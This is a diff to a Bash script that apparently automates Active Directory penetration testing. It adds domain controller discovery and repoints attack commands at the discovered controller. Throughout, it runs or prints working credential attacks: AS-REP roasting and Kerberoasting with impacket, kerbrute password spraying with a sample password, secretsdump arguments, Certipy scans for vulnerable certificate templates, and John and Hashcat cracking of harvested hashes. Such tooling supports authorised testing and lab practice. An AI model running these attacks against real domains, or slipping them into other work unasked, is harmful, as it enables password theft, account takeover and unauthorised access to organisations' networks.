@@ -8,6 +8,7 @@ domain=""
 hash=""
 os_type=""  # Will be auto-detected if not specified
 ANON_RUN="false"
+DC_IP=""    # Will be set to IP initially, then updated if a DC is found
 
 # --- Color Definitions & ADHD Friendly Output ---
 NC=$'\033[0m'
@@ -453,9 +454,42 @@ if [ -z "$IP" ]; then
     usage
 fi
 
+# Set DC_IP to the target IP initially
+DC_IP="$IP"
+
 # Auto-detect OS and Domain if not specified
 if [ -z "$os_type" ] || [ -z "$domain" ]; then
     detect_target_info
+fi
+
+# Attempt to discover the actual DC IP if a domain is known
+if [ -n "$domain" ] && [ "$os_type" = "windows" ]; then
+    log_info "Attempting to discover Domain Controller for domain '${BWHITE}$domain${NC}'..."
+    
+    # 1. Try via LDAP (port 389)
+    if check_port $IP 389; then
+        # This IP is likely a DC
+        DC_IP="$IP"
+        log_success "Target $IP appears to be a Domain Controller."
+    else
+        # 2. Try via DNS resolution of the domain itself
+        discovered_dc=$(host -t A "$domain" 2>/dev/null | awk '/has address/ {print $NF}' | head -n1)
+        if [ -n "$discovered_dc" ]; then
+            DC_IP="$discovered_dc"
+            log_success "Resolved domain '$domain' to DC IP: ${BWHITE}$DC_IP${NC}"
+        else
+            # 3. Try via SRV records
+            discovered_dc_srv=$(host -t SRV _ldap._tcp.dc._msdcs."$domain" 2>/dev/null | awk '/VBR/ {print $NF}' | sed 's/\.$//' | head -n1)
+            if [ -n "$discovered_dc_srv" ]; then
+                # Resolve the SRV hostname to an IP
+                discovered_dc_ip=$(host -t A "$discovered_dc_srv" 2>/dev/null | awk '/has address/ {print $NF}' | head -n1)
+                if [ -n "$discovered_dc_ip" ]; then
+                    DC_IP="$discovered_dc_ip"
+                    log_success "Discovered DC via SRV records: ${BWHITE}$discovered_dc_srv${NC} (${BWHITE}$DC_IP${NC})"
+                fi
+            fi
+        fi
+    fi
 fi
 
 # Initialize global flags
@@ -465,18 +499,18 @@ if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
 if [ -n "$hash" ]; then
     USER_FLAG="-u $user -H $hash"
     RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
-    SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
+    SECRETS_ARG="-hashes :$hash $domain/$user@$DC_IP"
     RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
 elif [ -n "$pass" ]; then
     USER_FLAG="-u $user -p $pass"
     RPC_ARG="-U $domain\\\\$user%$pass"
-    SECRETS_ARG="$domain/$user:$pass@$IP"
+    SECRETS_ARG="$domain/$user:$pass@$DC_IP"
     RPCDUMP_ARG="-u $user -p $pass -d $domain"
 else
     # Allow for user files or empty creds
     USER_FLAG="-u $user -p ''"
     RPC_ARG="-U $domain\\\\$user%"
-    SECRETS_ARG="$domain/$user@$IP"
+    SECRETS_ARG="$domain/$user@$DC_IP"
     RPCDUMP_ARG="-u $user -d $domain"
 fi
 
@@ -555,14 +589,14 @@ if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
     
     echo -e "${BCYAN}# 3. Kerberos Attacks:${NC}"
     if [ -n "$domain" ]; then
-        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting"
-        echo "impacket-GetUserSPNs $target -dc-ip $IP -request                       # Kerberoasting"
-        echo "impacket-getTGT $domain/$cred_string -dc-ip $IP                        # Request TGT"
-        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $IP           # Request Service Ticket"
+        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $DC_IP  # AS-REP roasting"
+        echo "impacket-GetUserSPNs $target -dc-ip $DC_IP -request                       # Kerberoasting"
+        echo "impacket-getTGT $domain/$cred_string -dc-ip $DC_IP                        # Request TGT"
+        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $DC_IP           # Request Service Ticket"
     else
-        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP"
-        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $IP -request"
-        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $IP"
+        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP"
+        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $DC_IP -request"
+        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $DC_IP"
     fi
     echo ""
     
@@ -574,10 +608,10 @@ if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
     echo ""
     
     echo -e "${BCYAN}# 5. LDAP/AD Enumeration:${NC}"
-    echo "impacket-GetADUsers $target -all -dc-ip $IP     # Dump all AD users"
-    echo "impacket-GetADComputers $target -all -dc-ip $IP # Dump all computers"
-    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $IP  # Read ACLs"
-    echo "impacket-findDelegation $target -dc-ip $IP      # Find delegation"
+    echo "impacket-GetADUsers $target -all -dc-ip $DC_IP     # Dump all AD users"
+    echo "impacket-GetADComputers $target -all -dc-ip $DC_IP # Dump all computers"
+    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $DC_IP  # Read ACLs"
+    echo "impacket-findDelegation $target -dc-ip $DC_IP      # Find delegation"
     echo ""
     
     echo -e "${BCYAN}# 6. MSSQL Attacks:${NC}"
@@ -1005,101 +1039,99 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
 
             # Check if Kerberos port is open to avoid long timeouts
             if ! check_port $IP 88 "Kerberos"; then
-                log_warning "Port 88 (Kerberos) seems closed. AS-REP Roasting will likely fail or be very slow."
-                log_info "If this is a slow network, you might want to run GetNPUsers manually."
-            fi
-
-            log_info "Attempting AS-REP Roasting (this can take a while if port 88 is filtered)..."
-            print_cmd "impacket-GetNPUsers \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
-            # Apply a 2-minute timeout to prevent infinite hanging
-            getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
-
-            if [ -z "$getnpusers_output" ] || [[ "$getnpusers_output" == *"Connection refused"* ]]; then
-                print_cmd "GetNPUsers.py \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
-                getnpusers_output=$(timeout 120s GetNPUsers.py "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
-            fi
-
-            if [ -n "$getnpusers_output" ]; then
-                echo "$getnpusers_output" | tee nxc-enum/smb/asrep-getnpusers.txt
+                log_warning "Port 88 (Kerberos) closed. Skipping AS-REP Roasting and Kerbrute checks."
             else
-                log_warning "AS-REP Roasting timed out or failed to produce output."
-            fi
+                log_info "Attempting AS-REP Roasting (this can take a while if port 88 is filtered)..."
+                print_cmd "impacket-GetNPUsers \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $DC_IP"
+                # Apply a 2-minute timeout to prevent infinite hanging
+                getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $DC_IP 2>/dev/null)
 
-            # Check if any AS-REP roastable users were found
-            if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
-                # Extract just the hashes to a clean file
-                grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
+                if [ -z "$getnpusers_output" ] || [[ "$getnpusers_output" == *"Connection refused"* ]]; then
+                    print_cmd "GetNPUsers.py \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $DC_IP"
+                    getnpusers_output=$(timeout 120s GetNPUsers.py "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $DC_IP 2>/dev/null)
+                fi
 
-                # Extract vulnerable usernames
-                vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
+                if [ -n "$getnpusers_output" ]; then
+                    echo "$getnpusers_output" | tee nxc-enum/smb/asrep-getnpusers.txt
+                else
+                    log_warning "AS-REP Roasting timed out or failed to produce output."
+                fi
 
-                log_success "AS-REP Roastable users found: ${BRED}$vulnerable_users${NC}"
-                log_info "Full output: ${BWHITE}nxc-enum/smb/asrep-getnpusers.txt${NC}"
-                log_info "Clean hashes: ${BWHITE}nxc-enum/smb/asrep-hashes.txt${NC}"
+                # Check if any AS-REP roastable users were found
+                if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
+                    # Extract just the hashes to a clean file
+                    grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
+
+                    # Extract vulnerable usernames
+                    vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
+
+                    log_success "AS-REP Roastable users found: ${BRED}$vulnerable_users${NC}"
+                    log_info "Full output: ${BWHITE}nxc-enum/smb/asrep-getnpusers.txt${NC}"
+                    log_info "Clean hashes: ${BWHITE}nxc-enum/smb/asrep-hashes.txt${NC}"
+                    echo ""
+                    log_info "Crack with John the Ripper:"
+                    echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
+                    echo ""
+                    log_info "Or with Hashcat:"
+                    echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
+                    echo ""
+                    log_info "Show cracked passwords:"
+                    echo "john --show nxc-enum/smb/asrep-hashes.txt"
+                fi
+
+                # --- Additional User Attacks ---
+                log_section "Additional User Attacks"
+
+                # 1. Kerbrute User Enumeration (Validation)
+                # Check if kerbrute is in PATH, if not check distinct location
+                KERBRUTE_CMD="kerbrute"
+                if ! command -v kerbrute &> /dev/null; then
+                     if [ -f "$HOME/.local/bin/kerbrute" ]; then
+                         KERBRUTE_CMD="$HOME/.local/bin/kerbrute"
+                     elif [ -f "/home/noah/.local/bin/kerbrute" ]; then
+                         KERBRUTE_CMD="/home/noah/.local/bin/kerbrute"
+                     elif [ -f "/usr/local/bin/kerbrute" ]; then
+                         KERBRUTE_CMD="/usr/local/bin/kerbrute"
+                     fi
+                fi
+
+                if command -v "$KERBRUTE_CMD" &> /dev/null || [ -f "$KERBRUTE_CMD" ]; then
+                     log_info "Kerbrute User Validation"
+                     if [ -n "$pass" ]; then
+                         log_info "Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
+                         print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain\" --dc $IP \"$users_file\" \"$pass\""
+                         timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
+                     else
+                         print_cmd "$KERBRUTE_CMD userenum -d \"$domain\" --dc $IP \"$users_file\""
+                         timeout 60s "$KERBRUTE_CMD" userenum -d "$domain" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
+                     fi
+                else
+                     log_warning "kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation."
+                fi
+
+                # 2. NetView Enumeration (Network/Session info)
+                log_info "NetView Network Enumeration"
+                # NetView usually needs a valid user/pass, checking if we have one, otherwise runs limited
+                if [ -n "$user" ] && [ -n "$pass" ]; then
+                     print_cmd "impacket-netview \"$domain\"/\"$user\":\"$pass\"@$IP"
+                     impacket-netview "$domain"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
+                else
+                     # Try with empty/anonymous if no creds yet (likely fails but worth a shot if Null session allowed)
+                     print_cmd "impacket-netview \"$domain\"/''@$IP -no-pass"
+                     impacket-netview "$domain"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
+                fi
+
+                # 3. GetTGT (Check for TGT acquisition)
+                log_info "GetTGT Check"
+                echo "[*] TGT acquisition requires a valid password/hash."
+                echo "[*] If you crack an AS-REP hash, get a TGT with:"
+                echo "    impacket-getTGT $domain/<user>:<password>"
                 echo ""
-                log_info "Crack with John the Ripper:"
-                echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
-                echo ""
-                log_info "Or with Hashcat:"
-                echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
-                echo ""
-                log_info "Show cracked passwords:"
-                echo "john --show nxc-enum/smb/asrep-hashes.txt"
             fi
-
-            # --- Additional User Attacks ---
-            log_section "Additional User Attacks"
-
-            # 1. Kerbrute User Enumeration (Validation)
-            # Check if kerbrute is in PATH, if not check distinct location
-            KERBRUTE_CMD="kerbrute"
-            if ! command -v kerbrute &> /dev/null; then
-                 if [ -f "$HOME/.local/bin/kerbrute" ]; then
-                     KERBRUTE_CMD="$HOME/.local/bin/kerbrute"
-                 elif [ -f "/home/noah/.local/bin/kerbrute" ]; then
-                     KERBRUTE_CMD="/home/noah/.local/bin/kerbrute"
-                 elif [ -f "/usr/local/bin/kerbrute" ]; then
-                     KERBRUTE_CMD="/usr/local/bin/kerbrute"
-                 fi
-            fi
-
-            if command -v "$KERBRUTE_CMD" &> /dev/null || [ -f "$KERBRUTE_CMD" ]; then
-                 log_info "Kerbrute User Validation"
-                 if [ -n "$pass" ]; then
-                     log_info "Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
-                     print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain\" --dc $IP \"$users_file\" \"$pass\""
-                     timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
-                 else
-                     print_cmd "$KERBRUTE_CMD userenum -d \"$domain\" --dc $IP \"$users_file\""
-                     timeout 60s "$KERBRUTE_CMD" userenum -d "$domain" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
-                 fi
-            else
-                 log_warning "kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation."
-            fi
-
-            # 2. NetView Enumeration (Network/Session info)
-            log_info "NetView Network Enumeration"
-            # NetView usually needs a valid user/pass, checking if we have one, otherwise runs limited
-            if [ -n "$user" ] && [ -n "$pass" ]; then
-                 print_cmd "impacket-netview \"$domain\"/\"$user\":\"$pass\"@$IP"
-                 impacket-netview "$domain"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
-            else
-                 # Try with empty/anonymous if no creds yet (likely fails but worth a shot if Null session allowed)
-                 print_cmd "impacket-netview \"$domain\"/''@$IP -no-pass"
-                 impacket-netview "$domain"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
-            fi
-
-            # 3. GetTGT (Check for TGT acquisition)
-            log_info "GetTGT Check"
-            echo "[*] TGT acquisition requires a valid password/hash."
-            echo "[*] If you crack an AS-REP hash, get a TGT with:"
-            echo "    impacket-getTGT $domain/<user>:<password>"
-            echo ""
             # --- End New Checks ---
-
         else
             log_warning "Could not auto-detect domain name"
-            log_info "Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
+            log_info "Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $DC_IP"
             log_info "Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
         fi
         echo ""
@@ -1813,22 +1845,23 @@ if [ "$os_type" = "windows" ]; then
             echo ""
             log_info "2. Password spraying with kerbrute:"
             if [ -n "$domain" ]; then
-                echo "kerbrute passwordspray -d $domain --dc $IP rpcuserlist.txt 'Password123'"
-                echo "kerbrute bruteuser -d $domain --dc $IP passwords.txt username"
-                echo ""
-                log_info "3. AS-REP roasting (no password needed):"
-                echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
-                echo ""
-                log_info "4. Validate usernames with kerbrute:"
-                echo "kerbrute userenum -d $domain --dc $IP rpcuserlist.txt"
+            echo "kerbrute passwordspray -d $domain --dc $DC_IP rpcuserlist.txt 'Password123'"
+            echo "kerbrute bruteuser -d $domain --dc $DC_IP passwords.txt username"
+            echo ""
+            log_info "3. AS-REP roasting (no password needed):"
+            echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $DC_IP"
+            echo ""
+            log_info "4. Validate usernames with kerbrute:"
+            echo "kerbrute userenum -d $domain --dc $DC_IP rpcuserlist.txt"
             else
-                echo "kerbrute passwordspray -d DOMAIN --dc $IP rpcuserlist.txt 'Password123'"
-                echo ""
-                log_info "3. AS-REP roasting (no password needed):"
-                echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
-                echo ""
-                log_info "Note: Specify domain with -d flag for kerbrute commands"
+            echo "kerbrute passwordspray -d DOMAIN --dc $DC_IP rpcuserlist.txt 'Password123'"
+            echo ""
+            log_info "3. AS-REP roasting (no password needed):"
+            echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $DC_IP"
+            echo ""
+            log_info "Note: Specify domain with -d flag for kerbrute commands"
             fi
+
             echo ""
         fi
         
@@ -1996,8 +2029,8 @@ if [ "$os_type" = "windows" ]; then
              fi
              
              # Run certipy find
-             print_cmd "$certipy_run_cmd -dc-ip $IP -vulnerable -enabled -stdout"
-             eval "$certipy_run_cmd -dc-ip $IP -vulnerable -enabled -stdout 2>/dev/null" | tee nxc-enum/ldap/certipy_output.txt
+             print_cmd "$certipy_run_cmd -dc-ip $DC_IP -vulnerable -enabled -stdout"
+             eval "$certipy_run_cmd -dc-ip $DC_IP -vulnerable -enabled -stdout 2>/dev/null" | tee nxc-enum/ldap/certipy_output.txt
              
              if [ -s nxc-enum/ldap/certipy_output.txt ]; then
                  log_success "Certipy scan complete! Results saved to ${BWHITE}nxc-enum/ldap/certipy_output.txt${NC}"
